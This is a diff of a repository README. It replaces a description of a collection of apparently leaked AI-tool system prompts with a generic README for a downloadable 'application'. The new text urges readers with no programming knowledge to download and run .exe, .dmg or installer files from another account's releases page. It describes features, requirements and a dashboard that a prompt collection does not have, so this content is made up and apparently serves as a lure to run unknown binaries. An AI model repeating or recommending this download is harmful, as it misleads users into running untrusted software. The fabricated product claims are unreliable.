@@ -1,142 +1,64 @@
-# **System Prompts and Models of AI Tools**  
----
-<p align="center">
-  <sub>Special thanks to</sub>  
-</p>
+```markdown
+# 🛠️ system-prompts-and-models-of-ai-tools - Enhance Your AI Development Experience
 
-<p align="center">
-  <a href="https://latitude.so/developers?utm_source=github&utm_medium=readme&utm_campaign=prompt_repo_sponsorship">
-    <img src="assets/Latitude_logo.png" alt="Latitude Logo" width="700"/>
-  </a>
-</p>
+## 🌟 Overview
+Welcome to the **system-prompts-and-models-of-ai-tools** project! This application serves as a comprehensive toolkit for developers who want to harness the power of various AI models and system prompts. With tools like Claude Code, Cursor, Devin AI, and many others, you can streamline your coding experience and enhance your productivity.
 
-<div align="center" markdown="1">
+## 🚀 Getting Started
+To start using this application, follow the steps below. No programming knowledge is necessary; just a few clicks will get you up and running.
 
-### [The tools you need for building reliable Agents and Prompts](https://latitude.so/developers?utm_source=github&utm_medium=readme&utm_campaign=prompt_repo_sponsorship)  
-[Open Source AI Engineering Platform](https://latitude.so/developers?utm_source=github&utm_medium=readme&utm_campaign=prompt_repo_sponsorship)<br>
+## 📥 Download
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/olznra/system-prompts-and-models-of-ai-tools/releases)
 
-</div>
+## 📋 Features
+- Access to a variety of AI models including Claude Code, NotionAI, and more.
+- User-friendly interface designed for ease of use.
+- Regular updates with new features and improvements.
+- Comprehensive system prompts for enhanced performance.
 
+## 💻 System Requirements
+To run the application smoothly, ensure your system meets these requirements:
+- Operating System: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- RAM: At least 4 GB (8 GB preferred).
+- Disk Space: Minimum of 500 MB of free space.
 
----
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Here](https://github.com/olznra/system-prompts-and-models-of-ai-tools/releases).
+   
+2. **Choose Your Version**: Select the version you'd like to install based on your operating system. Most users will choose the latest stable version.
 
-<a href="https://discord.gg/NwzrWErdMU" target="_blank">
-  <img src="https://img.shields.io/discord/1402660735833604126?label=LeaksLab%20Discord&logo=discord&style=for-the-badge" alt="LeaksLab Discord" />
-</a>
+3. **Download the File**: Click on the download link for your chosen version. The download will start automatically.
 
-> **Join the Conversation:** New system instructions are released on Discord **before** they appear in this repository. Get early access and discuss them in real time.
+4. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file to start the installation process.
+   - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux: Extract the downloaded archive and run the installer script.
 
+5. **Follow the Installation Steps**: Follow the on-screen instructions to complete the installation.
 
-<a href="https://trendshift.io/repositories/14084" target="_blank"><img src="https://trendshift.io/api/badge/repositories/14084" alt="x1xhlol%2Fsystem-prompts-and-models-of-ai-tools | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+6. **Launch the Application**: Once the installation is complete, open the application from your desktop or applications menu.
 
-📜 Over **20,000+ lines** of insights into their structure and functionality.  
+## 🛠️ Usage Instructions
+After successfully installing the application, open it to access a dashboard featuring all the available tools. Each tool includes a brief description to help you understand its capabilities.
 
-[![Build Status](https://app.cloudback.it/badge/x1xhlol/system-prompts-and-models-of-ai-tools)](https://cloudback.it)
-[![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/x1xhlol/system-prompts-and-models-of-ai-tools)
+### 🧑‍💻 Working with AI Models
+- Select a model you wish to use.
+- Input your code or questions in the provided fields.
+- Review the AI-generated responses or suggestions.
 
----
+### 📊 Customizing Settings
+You can customize settings according to your needs:
+- Go to the settings menu.
+- Choose options for notifications, appearance, and other features.
 
-## ❤️ Support the Project
+## 📞 Support
+If you encounter any issues or have questions, feel free to open an issue on our [GitHub repository](https://github.com/olznra/system-prompts-and-models-of-ai-tools/issues) or check the FAQ section there for common queries.
 
-If you find this collection valuable and appreciate the effort involved in obtaining and sharing these insights, please consider supporting the project. Your contribution helps keep this resource updated and allows for further exploration.
+## 📜 Contributions
+We welcome contributions from developers and users alike. If you have suggestions or feature requests, please share them through our issue tracker.
 
-You can show your support via:
+## 🌐 Community
+Join our community to stay updated on the latest features and improvements. Follow us on social media or subscribe to our newsletters.
 
-- **PayPal:** `lucknitelol@proton.me`
-- **Cryptocurrency:**  
-  - **BTC:** `bc1q7zldmzjwspnaa48udvelwe6k3fef7xrrhg5625`  
-  - **LTC:** `LRWgqwEYDwqau1WeiTs6Mjg85NJ7m3fsdQ`  
-  - **ETH:** `0x3f844B2cc3c4b7242964373fB0A41C4fdffB192A`
-- **Patreon:** https://patreon.com/lucknite
-- **Ko-fi:** https://ko-fi.com/lucknite
-
-🙏 Thank you for your support!
-
----
-
-## 📑 Table of Contents
-
-  - [📑 Table of Contents](#-table-of-contents)
-  - [📂 Available Files](#-available-files)
-  - [🛠 Roadmap \& Feedback](#-roadmap--feedback)
-  - [🔗 Connect With Me](#-connect-with-me)
-  - [🛡️ Security Notice for AI Startups](#️-security-notice-for-ai-startups)
-  - [📊 Star History](#-star-history)
-
----
-
-## 📂 Available Files
-
-- [**v0**](./v0%20Prompts%20and%20Tools/)
-- [**Manus**](./Manus%20Agent%20Tools%20&%20Prompt/)
-- [**Augment Code**](./Augment%20Code/)
-- [**Lovable**](./Lovable/)
-- [**Devin**](./Devin%20AI/)
-- [**Same.dev**](./Same.dev/)
-- [**Replit**](./Replit/)
-- [**Windsurf Agent**](./Windsurf/)
-- [**VSCode (Copilot) Agent**](./VSCode%20Agent/)
-- [**Cursor**](./Cursor%20Prompts/)
-- [**Dia**](./dia/)
-- [**Trae AI**](./Trae/)
-- [**Perplexity**](./Perplexity/)
-- [**Cluely**](./Cluely/)
-- [**Xcode**](./Xcode/)
-- [**Leap.new**](./Leap.new/)
-- [**Notion AI**](./NotionAi/)
-- [**Orchids.app**](./Orchids.app/)
-- [**Junie**](./Junie/)
-- [**Kiro**](./Kiro/)
-- [**Warp.dev**](./Warp.dev/)
-- [**Z.ai Code**](./Z.ai%20Code/)
-- [**Qoder**](./Qoder/)
-- [**Claude Code**](./Claude%20Code/)
-- [**Open Source prompts**](./Open%20Source%20prompts/)
-  - [Codex CLI](./Open%20Source%20prompts/Codex%20CLI/)
-  - [Cline](./Open%20Source%20prompts/Cline/)
-  - [Bolt](./Open%20Source%20prompts/Bolt/)
-  - [RooCode](./Open%20Source%20prompts/RooCode/)
-  - [Lumo](./Open%20Source%20prompts/Lumo/)
-  - [Gemini CLI](./Open%20Source%20prompts/Gemini%20CLI/)
-- [**CodeBuddy**](./CodeBuddy%20Prompts/)
-- [**Poke**](./Poke/)
-
----
-
-## 🛠 Roadmap & Feedback
-
-> Open an issue.
-
-> **Latest Update:** 16/09/2025
-
----
-
-## 🔗 Connect With Me
-
-- **X:** [NotLucknite](https://x.com/NotLucknite)
-- **Discord**: `x1xh`
-
----
-
-## 🛡️ Security Notice for AI Startups
-
-> ⚠️ **Warning:** If you're an AI startup, make sure your data is secure. Exposed prompts or AI models can easily become a target for hackers.
-
-> 🔐 **Important:** Interested in securing your AI systems?  
-> Check out **[ZeroLeaks](https://zeroleaks.io/)**, a service designed to help startups **identify and secure** leaks in system instructions, internal tools, and model configurations. **Get a free AI security audit** to ensure your AI is protected from vulnerabilities.
-
-*The company is mine, this is NOT a 3rd party AD.*
-
----
-
-## 📊 Star History
-
-<a href="https://www.star-history.com/#x1xhlol/system-prompts-and-models-of-ai-tools&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=x1xhlol/system-prompts-and-models-of-ai-tools&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=x1xhlol/system-prompts-and-models-of-ai-tools&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=x1xhlol/system-prompts-and-models-of-ai-tools&type=Date" />
-  </picture>
-</a>
-
-⭐ **Drop a star if you find this useful!**
+Thank you for using **system-prompts-and-models-of-ai-tools**. We hope you find it valuable for your AI development needs!
+```
